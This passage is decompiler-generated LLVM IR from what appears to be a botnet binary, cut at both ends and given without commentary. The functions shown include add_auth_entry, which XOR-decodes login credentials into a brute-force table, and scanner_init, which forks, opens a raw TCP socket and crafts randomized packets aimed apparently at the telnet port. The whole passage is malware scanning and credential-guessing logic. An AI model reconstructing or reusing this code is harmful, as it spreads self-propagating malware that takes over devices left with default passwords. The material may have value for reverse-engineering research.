  %v0_cd2c = load i32, i32* @r5, align 4
  %v1_cd2c = add i32 %v0_cd2c, 4
  %v2_cd2c = inttoptr i32 %v1_cd2c to i32*
  %v3_cd2c = load i32, i32* %v2_cd2c, align 4
  store i32 %v3_cd2c, i32* @r4, align 4
  %v0_cd30 = load i32, i32* @r6, align 4
  store i32 %v0_cd30, i32* @r2, align 4
  store i32 %v3_cd2c, i32* %r0.global-to-local, align 4
  %v2_cd3c = call i32 @__libc_fcntl(i32 %v3_cd2c, i32 3)
  %v1_cd44 = or i32 %v2_cd3c, 2048
  store i32 %v1_cd44, i32* @r2, align 4
  %v0_cd48 = load i32, i32* @r4, align 4
  store i32 %v0_cd48, i32* %r0.global-to-local, align 4
  %v2_cd4c = call i32 @__libc_fcntl(i32 %v0_cd48, i32 4)
  store i32 %v2_cd4c, i32* %r0.global-to-local, align 4
  %v2_cd54 = load i32, i32* @global_var_20f84.119, align 4
  store i32 %v2_cd54, i32* %r2.global-to-local, align 4
  %v1_cd5c = load i32, i32* @r5, align 4
  %v2_cd5c = add i32 %v1_cd5c, 12
  %v3_cd5c = inttoptr i32 %v2_cd5c to i32*
  store i32 1, i32* %v3_cd5c, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_cd68 = load i32, i32* %r2.global-to-local, align 4
  %v1_cd68 = load i32, i32* @r5, align 4
  %v2_cd68 = add i32 %v1_cd68, 8
  %v3_cd68 = inttoptr i32 %v2_cd68 to i32*
  store i32 %v0_cd68, i32* %v3_cd68, align 4
  %v0_cd6c = load i32, i32* @r5, align 4
  %v1_cd70 = add i32 %v0_cd6c, 4
  %v2_cd70 = inttoptr i32 %v1_cd70 to i32*
  %v3_cd70 = load i32, i32* %v2_cd70, align 4
  store i32 %v3_cd70, i32* %r0.global-to-local, align 4
  %v1_cd74 = add i32 %v0_cd6c, 20
  %v2_cd74 = inttoptr i32 %v1_cd74 to i16*
  %v3_cd74 = load i16, i16* %v2_cd74, align 2
  %v4_cd74 = zext i16 %v3_cd74 to i32
  store i32 %v4_cd74, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cd88 = call i32 @__libc_connect(i32 %v3_cd70, i32 %v2_cce0, i32 16)
  store i32 %v3_cd88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cd8c

dec_label_pc_cd8c:                                ; preds = %entry.dec_label_pc_cd8c_crit_edge, %dec_label_pc_cd1c
  %v1_cd94 = phi i32 [ %v1_cd94.pre, %entry.dec_label_pc_cd8c_crit_edge ], [ %v3_cd88, %dec_label_pc_cd1c ]
  %v2_cd90 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_cd90, i32* @r4, align 4
  store i32 %v6_ccd4, i32* @r5, align 4
  store i32 %v9_ccd4, i32* @r6, align 4
  store i32 %v12_ccd4, i32* @lr, align 4
  ret i32 %v1_cd94

; uselistorder directives
  uselistorder i32 %v3_cd0c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @util_zero, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_cd8c, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_cd9c = load i32, i32* @r4, align 4
  %v6_cd9c = load i32, i32* @r5, align 4
  %v9_cd9c = load i32, i32* @r6, align 4
  %v12_cd9c = load i32, i32* @r7, align 4
  %v15_cd9c = load i32, i32* @r8, align 4
  %v18_cd9c = load i32, i32* @sb, align 4
  %v21_cd9c = load i32, i32* @sl, align 4
  %v24_cd9c = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_20f50.121 to i32), i32* @fp, align 4
  %v2_cda4 = load i32, i32* @global_var_20f50.121, align 4
  store i32 ptrtoint (i32* @global_var_20f7c.123 to i32), i32* @sl, align 4
  %v1_cdb0 = add i32 %v2_cda4, 1
  store i32 %v1_cdb0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_cdbc = load i32, i32* @global_var_20f7c.123, align 4
  store i32 %v2_cdbc, i32* %r0.global-to-local, align 4
  %v3_cdc0 = mul i32 %v1_cdb0, 16
  store i32 %v3_cdc0, i32* %r1.global-to-local, align 4
  %v4_cdc8 = inttoptr i32 %v2_cdbc to i32*
  %v5_cdc8 = call i32 @realloc(i32* %v4_cdc8, i32 %v3_cdc0, i32 %arg3, i32 %v1_cdb0)
  %v2_cdcc = load i32, i32* @global_var_20f50.121, align 4
  store i32 %v2_cdcc, i32* %r2.global-to-local, align 4
  store i32 %v5_cdc8, i32* @r8, align 4
  %v0_cdd4 = load i32, i32* @r5, align 4
  store i32 %v0_cdd4, i32* %r0.global-to-local, align 4
  %v1_cddc = load i32, i32* @sl, align 4
  %v2_cddc = inttoptr i32 %v1_cddc to i32*
  store i32 %v5_cdc8, i32* %v2_cddc, align 4
  %v1_cde0 = inttoptr i32 %v0_cdd4 to i8*
  %v2_cde0 = call i32 @util_strlen(i8* %v1_cde0)
  %sext = mul i32 %v2_cde0, 16777216
  %v1_cde4 = sdiv i32 %sext, 16777216
  %v2_cde4 = add nsw i32 %v1_cde4, 1
  store i32 %v2_cde4, i32* @r4, align 4
  store i32 %v1_cde4, i32* @r7, align 4
  store i32 %v2_cde4, i32* @r0, align 4
  %v0_cdf0 = call i32 @malloc()
  store i32 %v0_cdf0, i32* %r0.global-to-local, align 4
  %v0_cdf4 = load i32, i32* @r5, align 4
  store i32 %v0_cdf4, i32* %r1.global-to-local, align 4
  %v0_cdf8 = load i32, i32* @r4, align 4
  store i32 %v0_cdf8, i32* %r2.global-to-local, align 4
  store i32 %v0_cdf0, i32* %r6.global-to-local, align 4
  %v3_ce00 = call i32 @util_memcpy(i32 %v0_cdf0, i32 %v0_cdf4, i32 %v0_cdf8)
  store i32 %v3_ce00, i32* %r0.global-to-local, align 4
  %v0_ce04 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_ce04, 1
  %extract.t6 = trunc i32 %v0_ce04 to i8
  br i1 %tmp22, label %dec_label_pc_ce28, label %dec_label_pc_ce0c

dec_label_pc_ce0c:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ce10

dec_label_pc_ce10:                                ; preds = %dec_label_pc_ce10, %dec_label_pc_ce0c
  %v2_ce18 = phi i32 [ %v1_ce1c, %dec_label_pc_ce10 ], [ 0, %dec_label_pc_ce0c ]
  %v1_ce10 = load i32, i32* %r6.global-to-local, align 4
  %v2_ce10 = add i32 %v1_ce10, %v2_ce18
  %v3_ce10 = inttoptr i32 %v2_ce10 to i8*
  %v4_ce10 = load i8, i8* %v3_ce10, align 1
  %v6_ce10 = zext i8 %v4_ce10 to i32
  %v1_ce14 = xor i32 %v6_ce10, 80
  store i32 %v1_ce14, i32* %r3.global-to-local, align 4
  %v1_ce18 = trunc i32 %v1_ce14 to i8
  store i8 %v1_ce18, i8* %v3_ce10, align 1
  %v0_ce1c = load i32, i32* %r2.global-to-local, align 4
  %v1_ce1c = add i32 %v0_ce1c, 1
  store i32 %v1_ce1c, i32* %r2.global-to-local, align 4
  %v1_ce20 = load i32, i32* @r7, align 4
  %v9_ce20 = icmp eq i32 %v1_ce1c, %v1_ce20
  br i1 %v9_ce20, label %dec_label_pc_ce28.loopexit, label %dec_label_pc_ce10

dec_label_pc_ce28.loopexit:                       ; preds = %dec_label_pc_ce10
  %extract.t = trunc i32 %v1_ce1c to i8
  br label %dec_label_pc_ce28

dec_label_pc_ce28:                                ; preds = %dec_label_pc_ce28.loopexit, %entry
  %v0_ce38.off0 = phi i8 [ %extract.t, %dec_label_pc_ce28.loopexit ], [ %extract.t6, %entry ]
  %v2_ce28 = load i32, i32* @global_var_20f50.121, align 4
  %v2_ce2c = load i32, i32* @global_var_20f7c.123, align 4
  %v3_ce30 = mul i32 %v2_ce28, 16
  store i32 %v3_ce30, i32* @sb, align 4
  %v2_ce34 = add i32 %v2_ce2c, %v3_ce30
  store i32 %v2_ce34, i32* %r2.global-to-local, align 4
  %v3_ce38 = add i32 %v2_ce34, 12
  %v4_ce38 = inttoptr i32 %v3_ce38 to i8*
  store i8 %v0_ce38.off0, i8* %v4_ce38, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_cdcc, i32* %r3.global-to-local, align 4
  %v0_ce44 = load i32, i32* %r6.global-to-local, align 4
  %v1_ce44 = load i32, i32* @r8, align 4
  %v5_ce44 = mul i32 %v2_cdcc, 16
  %v6_ce44 = add i32 %v1_ce44, %v5_ce44
  %v7_ce44 = inttoptr i32 %v6_ce44 to i32*
  store i32 %v0_ce44, i32* %v7_ce44, align 4
  %v2_ce48 = load i32, i32* @global_var_20f7c.123, align 4
  store i32 %v2_ce48, i32* @r7, align 4
  %v1_ce4c = inttoptr i32 %arg2 to i8*
  %v2_ce4c = call i32 @util_strlen(i8* %v1_ce4c)
  %sext1 = mul i32 %v2_ce4c, 16777216
  %v1_ce50 = sdiv i32 %sext1, 16777216
  %v2_ce50 = add nsw i32 %v1_ce50, 1
  store i32 %v2_ce50, i32* @r4, align 4
  store i32 %v1_ce50, i32* @r6, align 4
  store i32 %v2_ce50, i32* @r0, align 4
  %v0_ce5c = call i32 @malloc()
  store i32 %v0_ce5c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_ce64 = load i32, i32* @r4, align 4
  store i32 %v0_ce64, i32* %r2.global-to-local, align 4
  store i32 %v0_ce5c, i32* %r5.global-to-local, align 4
  %v3_ce6c = call i32 @util_memcpy(i32 %v0_ce5c, i32 %arg2, i32 %v0_ce64)
  store i32 %v3_ce6c, i32* %r0.global-to-local, align 4
  %v0_ce70 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ce70, 1
  %extract.t8 = trunc i32 %v0_ce70 to i8
  br i1 %tmp23, label %dec_label_pc_ce94, label %dec_label_pc_ce78

dec_label_pc_ce78:                                ; preds = %dec_label_pc_ce28
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ce7c

dec_label_pc_ce7c:                                ; preds = %dec_label_pc_ce7c, %dec_label_pc_ce78
  %v2_ce84 = phi i32 [ %v1_ce88, %dec_label_pc_ce7c ], [ 0, %dec_label_pc_ce78 ]
  %v1_ce7c = load i32, i32* %r5.global-to-local, align 4
  %v2_ce7c = add i32 %v1_ce7c, %v2_ce84
  %v3_ce7c = inttoptr i32 %v2_ce7c to i8*
  %v4_ce7c = load i8, i8* %v3_ce7c, align 1
  %v6_ce7c = zext i8 %v4_ce7c to i32
  %v1_ce80 = xor i32 %v6_ce7c, 80
  store i32 %v1_ce80, i32* %r3.global-to-local, align 4
  %v1_ce84 = trunc i32 %v1_ce80 to i8
  store i8 %v1_ce84, i8* %v3_ce7c, align 1
  %v0_ce88 = load i32, i32* %r2.global-to-local, align 4
  %v1_ce88 = add i32 %v0_ce88, 1
  store i32 %v1_ce88, i32* %r2.global-to-local, align 4
  %v1_ce8c = load i32, i32* @r6, align 4
  %v9_ce8c = icmp eq i32 %v1_ce88, %v1_ce8c
  br i1 %v9_ce8c, label %dec_label_pc_ce94.loopexit, label %dec_label_pc_ce7c

dec_label_pc_ce94.loopexit:                       ; preds = %dec_label_pc_ce7c
  %extract.t7 = trunc i32 %v1_ce88 to i8
  br label %dec_label_pc_ce94

dec_label_pc_ce94:                                ; preds = %dec_label_pc_ce94.loopexit, %dec_label_pc_ce28
  %v0_cea4.off0 = phi i8 [ %extract.t7, %dec_label_pc_ce94.loopexit ], [ %extract.t8, %dec_label_pc_ce28 ]
  %v2_ce94 = load i32, i32* @global_var_20f50.121, align 4
  store i32 %v2_ce94, i32* %r0.global-to-local, align 4
  %v2_ce98 = load i32, i32* @global_var_20f7c.123, align 4
  %v3_ce9c = mul i32 %v2_ce94, 16
  store i32 %v3_ce9c, i32* %r1.global-to-local, align 4
  %v2_cea0 = or i32 %v3_ce9c, 13
  %v3_cea4 = add i32 %v2_cea0, %v2_ce98
  %v4_cea4 = inttoptr i32 %v3_cea4 to i8*
  store i8 %v0_cea4.off0, i8* %v4_cea4, align 1
  store i32 ptrtoint (i16** @global_var_20f80.125 to i32), i32* %r4.global-to-local, align 4
  %v2_ceb0 = load i16, i16* bitcast (i16** @global_var_20f80.125 to i16*), align 4
  %v3_ceb0 = zext i16 %v2_ceb0 to i32
  store i32 %v3_ceb0, i32* %lr.global-to-local, align 4
  %v2_ceb8 = load i32, i32* @global_var_20f7c.123, align 4
  store i32 %v2_ceb8, i32* %r2.global-to-local, align 4
  %v0_cec0 = load i32, i32* %r1.global-to-local, align 4
  %v2_cec0 = add i32 %v0_cec0, %v2_ceb8
  store i32 %v2_cec0, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_20f80.125 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_cec8 = load i32, i32* @sb, align 4
  %v1_cec8 = load i32, i32* @r7, align 4
  %v2_cec8 = add i32 %v1_cec8, %v0_cec8
  store i32 %v2_cec8, i32* %ip.global-to-local, align 4
  %v0_cecc = load i32, i32* %r0.global-to-local, align 4
  %v1_cecc = add i32 %v0_cecc, 1
  store i32 %v1_cecc, i32* %r0.global-to-local, align 4
  %v3_ced0 = add i32 %v2_cec0, 10
  %v4_ced0 = inttoptr i32 %v3_ced0 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_20f80.125 to i32), i32 16), i32 16) to i16), i16* %v4_ced0, align 2
  %v0_ced4 = load i32, i32* %lr.global-to-local, align 4
  %v1_ced4 = trunc i32 %v0_ced4 to i16
  %v2_ced4 = load i32, i32* %r1.global-to-local, align 4
  %v3_ced4 = add i32 %v2_ced4, 8
  %v4_ced4 = inttoptr i32 %v3_ced4 to i16*
  store i16 %v1_ced4, i16* %v4_ced4, align 2
  %v0_ced8 = load i32, i32* %r5.global-to-local, align 4
  %v1_ced8 = load i32, i32* %ip.global-to-local, align 4
  %v2_ced8 = add i32 %v1_ced8, 4
  %v3_ced8 = inttoptr i32 %v2_ced8 to i32*
  store i32 %v0_ced8, i32* %v3_ced8, align 4
  %v1_cedc = load i32, i32* @fp, align 4
  %v2_cedc = inttoptr i32 %v1_cedc to i32*
  store i32 %v1_cecc, i32* %v2_cedc, align 4
  %v0_cee0 = load i32, i32* %r3.global-to-local, align 4
  %v1_cee0 = trunc i32 %v0_cee0 to i16
  %v2_cee0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cee0 = inttoptr i32 %v2_cee0 to i16*
  store i16 %v1_cee0, i16* %v3_cee0, align 2
  store i32 %v3_cd9c, i32* @r4, align 4
  store i32 %v6_cd9c, i32* @r5, align 4
  store i32 %v9_cd9c, i32* @r6, align 4
  store i32 %v12_cd9c, i32* @r7, align 4
  store i32 %v15_cd9c, i32* @r8, align 4
  store i32 %v18_cd9c, i32* @sb, align 4
  store i32 %v21_cd9c, i32* @sl, align 4
  store i32 %v24_cd9c, i32* @fp, align 4
  ret i32 %v1_cecc

; uselistorder directives
  uselistorder i32 %v3_ce9c, { 1, 0 }
  uselistorder i32 %v1_ce88, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ce5c, { 1, 0, 2 }
  uselistorder i32 %v3_ce30, { 1, 0 }
  uselistorder i32 %v1_ce1c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_cdf0, { 1, 0, 2 }
  uselistorder i32 %v2_cdcc, { 1, 0, 2 }
  uselistorder i32 %v3_cdc0, { 1, 0 }
  uselistorder i32 %v1_cdb0, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp314 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i16, align 2
  %tmp342 = call i16 @__decompiler_undefined_function_2()
  %v6_cefc = load i32, i32* @r5, align 4
  %v18_cefc = load i32, i32* @sb, align 4
  %v21_cefc = load i32, i32* @sl, align 4
  %v24_cefc = load i32, i32* @fp, align 4
  %v0_cf08 = call i32 @__libc_fork()
  store i32 %v0_cf08, i32* %r0.global-to-local, align 4
  %v7_cf0c = icmp eq i32 %v0_cf08, -1
  %. = zext i1 %v7_cf0c to i32
  %tmp345 = icmp slt i32 %v0_cf08, 1
  %storemerge308 = select i1 %tmp345, i32 %., i32 1
  store i32 %storemerge308, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23a68.117 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cf28 = icmp eq i32 %storemerge308, 0
  store i1 %v2_cf28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_cf08, i32* @global_var_23a68.117, align 4
  br i1 %v2_cf28, label %dec_label_pc_d208, label %dec_label_pc_cf34

dec_label_pc_cf34:                                ; preds = %entry
  store i32 %v6_cefc, i32* @r5, align 4
  store i32 %v18_cefc, i32* @sb, align 4
  store i32 %v21_cefc, i32* @sl, align 4
  store i32 %v24_cefc, i32* @fp, align 4
  ret i32 %v0_cf08

dec_label_pc_d208:                                ; preds = %entry
  %v0_d208 = call i32 @util_local_addr()
  store i32 %v0_d208, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23a4c.55 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d208, i32* @global_var_23a4c.55, align 4
  %v1_d214 = call i32 @rand_init(i32 %v0_d208)
  %v0_d218 = load i32, i32* @r4, align 4
  store i32 %v0_d218, i32* %r0.global-to-local, align 4
  %v1_d21c = inttoptr i32 %v0_d218 to i32*
  %v2_d21c = call i32 @__GI_time(i32* %v1_d21c)
  store i32 ptrtoint (i32* @global_var_20f84.119 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_d21c, i32* @global_var_20f84.119, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_d230 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_23a60.130 to i32), i32* %r3.global-to-local, align 4
  %v0_d238 = load i32, i32* @r4, align 4
  %v5_d238 = trunc i32 %v0_d238 to i16
  store i16 %v5_d238, i16* %stack_var_-52, align 2
  store i32 %v2_d230, i32* @global_var_23a60.130, align 4
  store i32 %v0_d238, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %dec_label_pc_d244.dec_label_pc_d244_crit_edge, %dec_label_pc_d208
  %v2_d250 = phi i32 [ %v2_d250.pre, %dec_label_pc_d244.dec_label_pc_d244_crit_edge ], [ %v2_d230, %dec_label_pc_d208 ]
  %v0_d258 = phi i32 [ %v0_d288, %dec_label_pc_d244.dec_label_pc_d244_crit_edge ], [ %v0_d238, %dec_label_pc_d208 ]
  %v3_d244162 = phi i16 [ %v5_d288, %dec_label_pc_d244.dec_label_pc_d244_crit_edge ], [ %v5_d238, %dec_label_pc_d208 ]
  %v4_d244 = sext i16 %v3_d244162 to i32
  %v3_d24c = mul i32 %v0_d258, 256
  store i32 %v3_d24c, i32* %ip.global-to-local, align 4
  store i32 %v2_d250, i32* @lr, align 4
  %v2_d260 = mul nsw i32 %v4_d244, 288
  %v2_d264 = mul i32 %v0_d258, 288
  %v1_d268 = add nsw i32 %v4_d244, 1
  store i32 %v1_d268, i32* %r0.global-to-local, align 4
  %v2_d26c = add i32 %v2_d260, %v2_d250
  store i32 %v2_d26c, i32* %r2.global-to-local, align 4
  %v2_d270 = add i32 %v2_d264, %v2_d250
  store i32 %v2_d270, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_d280 = add i32 %v2_d26c, 4
  %v3_d280 = inttoptr i32 %v2_d280 to i32*
  store i32 -1, i32* %v3_d280, align 4
  %v0_d284 = load i32, i32* @r5, align 4
  %v1_d284 = load i32, i32* %r1.global-to-local, align 4
  %v2_d284 = add i32 %v1_d284, 12
  %v3_d284 = inttoptr i32 %v2_d284 to i32*
  store i32 %v0_d284, i32* %v3_d284, align 4
  %v0_d288 = load i32, i32* %r0.global-to-local, align 4
  %v5_d288 = trunc i32 %v0_d288 to i16
  %v7_d28c = icmp sgt i16 %v3_d244162, 254
  br i1 %v7_d28c, label %dec_label_pc_d290, label %dec_label_pc_d244.dec_label_pc_d244_crit_edge

dec_label_pc_d244.dec_label_pc_d244_crit_edge:    ; preds = %dec_label_pc_d244
  %v2_d250.pre = load i32, i32* @global_var_23a60.130, align 4
  br label %dec_label_pc_d244

dec_label_pc_d290:                                ; preds = %dec_label_pc_d244
  store i16 %v5_d288, i16* %stack_var_-52, align 2
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_d29c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_d29c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23a64.132 to i32), i32* %r2.global-to-local, align 4
  %v2_d2a4 = icmp eq i32 %v3_d29c, -1
  store i1 %v2_d2a4, i1* %cpsr_c.global-to-local, align 1
  %v7_d2a4 = icmp eq i32 %v3_d29c, -1
  store i1 %v7_d2a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d29c, i32* @r4, align 4
  store i32 %v3_d29c, i32* @global_var_23a64.132, align 4
  br i1 %v7_d2a4, label %dec_label_pc_e410, label %dec_label_pc_d2b4

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d290
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_d2b8 = load i32, i32* @r5, align 4
  store i32 %v0_d2b8, i32* @r2, align 4
  %v2_d2bc = call i32 @__libc_fcntl(i32 %v3_d29c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_d2c4 = or i32 %v2_d2bc, 2048
  store i32 %v1_d2c4, i32* @r2, align 4
  %v0_d2c8 = load i32, i32* @r4, align 4
  store i32 %v0_d2c8, i32* %r0.global-to-local, align 4
  %v2_d2cc = call i32 @__libc_fcntl(i32 %v0_d2c8, i32 4)
  %v2_d2d4 = load i32, i32* @global_var_23a64.132, align 4
  store i32 %v2_d2d4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_d2e0 = load i32, i32* @r5, align 4
  store i32 %v0_d2e0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_d2e8 = ptrtoint i16* %stack_var_-52 to i32
  store i32 %v2_d2e8, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i16 1, i16* %stack_var_-52, align 2
  %v5_d2f8 = call i32 @__GI_setsockopt(i32 %v2_d2d4, i32 %v0_d2e0, i32 3, i32 %v2_d2e8, i32 4)
  store i32 %v5_d2f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d2fc = icmp eq i32 %v5_d2f8, 0
  store i1 %v2_d2fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d2fc, label %dec_label_pc_d304, label %dec_label_pc_e404

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2b4, %dec_label_pc_d304
  %v0_d304 = call i32 @rand_next()
  %v3_d308 = mul i32 %v0_d304, 65536
  store i32 %v3_d308, i32* %r0.global-to-local, align 4
  %v1_d310 = mul i32 %v0_d304, 256
  %v3_d314 = and i32 %v1_d310, 65280
  %tmp348 = udiv i32 %v0_d304, 256
  %v4_d318 = urem i32 %tmp348, 256
  %v5_d318 = or i32 %v4_d318, %v3_d314
  store i32 %v5_d318, i32* %r3.global-to-local, align 4
  %v2_d31c = icmp ugt i32 %v5_d318, 1023
  store i1 %v2_d31c, i1* %cpsr_c.global-to-local, align 1
  %v7_d31c = icmp eq i32 %v5_d318, 1024
  store i1 %v7_d31c, i1* %cpsr_z.global-to-local, align 1
  %v3_d324 = icmp ult i32 %v5_d318, 1022
  br i1 %v3_d324, label %dec_label_pc_d304, label %dec_label_pc_d328

dec_label_pc_d328:                                ; preds = %dec_label_pc_d304
  %v5_d320.le = trunc i32 %v0_d304 to i16
  store i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32* %r0.global-to-local, align 4
  %v2_d32c = load i8, i8* bitcast (i8** @global_var_20f54.134 to i8*), align 4
  %v3_d32c = zext i8 %v2_d32c to i32
  %v1_d330 = and i32 %v3_d32c, 240
  %v1_d334 = or i32 %v1_d330, 5
  store i32 %v1_d334, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_20f54.134 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_20f56.135 to i16*), align 4
  %v0_d354 = call i32 @rand_next()
  %v1_d354 = trunc i32 %v0_d354 to i16
  %v3_d35c = load i8, i8* @global_var_20f74.138, align 1
  store i32 ptrtoint (i32* @global_var_20f68.137 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32* %ip.global-to-local, align 4
  %tmp = urem i8 %v3_d35c, 16
  %v1_d368 = zext i8 %tmp to i32
  store i32 6, i32* @r4, align 4
  %v1_d370 = or i32 %v1_d368, 80
  store i32 %v1_d370, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_20f5c.139 to i8*), align 4
  store i16 %v1_d354, i16* bitcast (i32* @global_var_20f58.140 to i16*), align 4
  %v1_d380 = trunc i32 %v1_d370 to i8
  store i8 %v1_d380, i8* @global_var_20f74.138, align 1
  store i8 6, i8* bitcast (i32* @global_var_20f5d.141 to i8*), align 4
  %v4_d388 = sext i16 %v5_d320.le to i32
  store i32 %v4_d388, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_20f6a.142, align 2
  store i16 %v5_d320.le, i16* bitcast (i32* @global_var_20f68.137 to i16*), align 4
  %v0_d398 = call i32 @rand_next()
  %v1_d398 = trunc i32 %v0_d398 to i16
  %v3_d3a0 = load i8, i8* @global_var_20f75.143, align 1
  %v4_d3a0 = zext i8 %v3_d3a0 to i32
  store i32 ptrtoint (i32* @global_var_20f68.137 to i32), i32* %ip.global-to-local, align 4
  %v1_d3a8 = or i32 %v4_d3a0, 2
  store i32 %v1_d3a8, i32* %r3.global-to-local, align 4
  store i16 %v1_d398, i16* bitcast (i32* @global_var_20f76.144 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  %v1_d3b4 = trunc i32 %v1_d3a8 to i8
  store i8 %v1_d3b4, i8* @global_var_20f75.143, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_d3c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d3d0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), i32 ptrtoint (i32* @global_var_185f0.146 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), i32* %r0.global-to-local, align 4
